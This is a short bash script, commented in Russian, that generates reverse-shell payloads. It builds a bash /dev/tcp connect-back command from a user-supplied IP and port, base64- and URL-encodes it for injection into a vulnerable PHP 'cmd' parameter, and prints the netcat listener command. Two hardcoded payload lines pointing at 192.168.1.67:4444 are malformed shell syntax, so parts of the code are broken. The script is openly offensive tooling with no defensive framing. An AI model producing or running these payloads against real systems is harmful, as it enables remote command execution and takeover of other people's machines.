#!/bin/bash

echo "=== Генератор реверс-шелла ==="
read -p "Введите ваш IP (оканчивается на 90): " ip
read -p "Введите порт [4444]: " port
port=${port:-4444}  # По умолчанию 4444

# Создаем payload
PAYLOAD="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
PAYLOAD2=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.67/4444 0>&1'
PAYLOAD3=bash -i > /dev/tcp/192.168.1.67/4444 0<&1

echo ""
echo "1. Оригинальный payload:"
echo "$PAYLOAD"
echo ""

# Кодируем в base64
ENCODED=$(echo "$PAYLOAD" | base64 -w 0)
echo "2. Base64 encoded:"
echo "$ENCODED"
echo ""

# URL-encode для вставки в адресную строку
URL_ENCODED="bash%20-c%20%22echo%20%27$ENCODED%27%20%7C%20base64%20-d%20%7C%20bash%22"
echo "3. Для вставки в URL:"
echo "$URL_ENCODED"
echo ""

echo "4. Пример полного URL:"
echo "http://target.com/vuln.php?cmd=$URL_ENCODED"
echo ""

echo "5. Команда для запуска слушателя (выполните в другом терминале):"
echo "nc -nvlp $port"
